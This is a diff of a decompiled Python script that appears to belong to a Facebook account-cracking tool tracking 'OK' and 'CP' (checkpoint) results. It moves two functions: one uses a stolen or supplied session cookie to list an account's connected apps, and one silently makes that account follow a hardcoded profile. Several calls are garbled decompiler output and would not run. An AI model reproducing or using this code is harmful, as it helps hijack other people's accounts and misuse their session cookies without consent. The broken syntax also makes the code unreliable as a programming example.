@@ -1,5 +1,38 @@
 # Decompile by Mardis (Tools By Kapten-Kaizo)
 # Time Succes decompile : 2022-05-15 10:54:19.688328
+def cek_apk(session,coki):
+    w=session.get("https://m.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":coki}).text
+    sop = BeautifulSoup(w,"html.parser")
+    x = sop.find("form",method="post")
+    game = [i.text for i in x.find_all("h3")]
+    if len(game)==0:
+        print(f'\r%s[%s!%s] %sSORRY THERE IS NO ACTIVE  APK%s  '%(N,M,N,M,N))
+    else:
+        print(f'\r[🎮] %s \x1b[1;95m YOUR ACTIVE APPS   :{WHITE}'%(GREEN))
+        for i in range(len(game)):
+            print(f"\r[%s%s] %s%s"%(N,i+1,game[i].replace("Ditambahkan pada"," Ditambahkan pada"),N))
+        #else:
+            #print(f'\r %s[%s!%s] Sorry, Apk check failed invalid cookie'%(N,M,N))
+    w=session.get("https://m.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":coki}).text
+    sop = BeautifulSoup(w,"html.parser")
+    x = sop.find("form",method="post")
+    game = [i.text for i in x.find_all("h3")]
+    if len(game)==0:
+        print(f'\r%s[%s!%s] %sSORRY THERE IS NO EXPIRED APK%s           \n'%(N,M,N,M,N))
+    else:
+        print(f'\r[🎮] %s \x1b[1;95m YOUR EXPIRED APPS    :{WHITE}'%(M))
+        for i in range(len(game)):
+            print(f"\r[%s%s] %s%s"%(N,i+1,game[i].replace("Kedaluwarsa"," Kedaluwarsa"),N))
+        else:
+            print('')
+            print('')
+
+def follow(self, session, coki):
+        r = BeautifulSoup(session.get('https://m.facebook.com/profile.php?id=100015315258519', {
+            'cookie': coki }, **('cookies',)).text, 'html.parser')
+        get = r.find('a', 'Ikuti', **('string',)).get('href')
+        session.get('https://m.facebook.com' + str(get), {
+            'cookie': coki }, **('cookies',)).text
 import os
 try:
     import requests
@@ -152,40 +185,6 @@ def hasil(OK,cp):
 	    print('  \x1b[1;97m Total CP :\x1b[1;97m   %s \x1b[1;97KakTarani_CP.txt' % (H, P, str(len(cp))))
 	    input("\x1b[1;97mPress enter to back KakTarani Menu ")
 	    mohsin()
-
-def cek_apk(session,coki):
-    w=session.get("https://m.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":coki}).text
-    sop = BeautifulSoup(w,"html.parser")
-    x = sop.find("form",method="post")
-    game = [i.text for i in x.find_all("h3")]
-    if len(game)==0:
-        print(f'\r%s[%s!%s] %sSORRY THERE IS NO ACTIVE  APK%s  '%(N,M,N,M,N))
-    else:
-        print(f'\r[🎮] %s \x1b[1;95m YOUR ACTIVE APPS   :{WHITE}'%(GREEN))
-        for i in range(len(game)):
-            print(f"\r[%s%s] %s%s"%(N,i+1,game[i].replace("Ditambahkan pada"," Ditambahkan pada"),N))
-        #else:
-            #print(f'\r %s[%s!%s] Sorry, Apk check failed invalid cookie'%(N,M,N))
-    w=session.get("https://m.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":coki}).text
-    sop = BeautifulSoup(w,"html.parser")
-    x = sop.find("form",method="post")
-    game = [i.text for i in x.find_all("h3")]
-    if len(game)==0:
-        print(f'\r%s[%s!%s] %sSORRY THERE IS NO EXPIRED APK%s           \n'%(N,M,N,M,N))
-    else:
-        print(f'\r[🎮] %s \x1b[1;95m YOUR EXPIRED APPS    :{WHITE}'%(M))
-        for i in range(len(game)):
-            print(f"\r[%s%s] %s%s"%(N,i+1,game[i].replace("Kedaluwarsa"," Kedaluwarsa"),N))
-        else:
-            print('')
-            print('')
-
-def follow(self, session, coki):
-        r = BeautifulSoup(session.get('https://m.facebook.com/profile.php?id=100015315258519', {
-            'cookie': coki }, **('cookies',)).text, 'html.parser')
-        get = r.find('a', 'Ikuti', **('string',)).get('href')
-        session.get('https://m.facebook.com' + str(get), {
-            'cookie': coki }, **('cookies',)).text
 	
 def mohsin():
     os.system('clear')
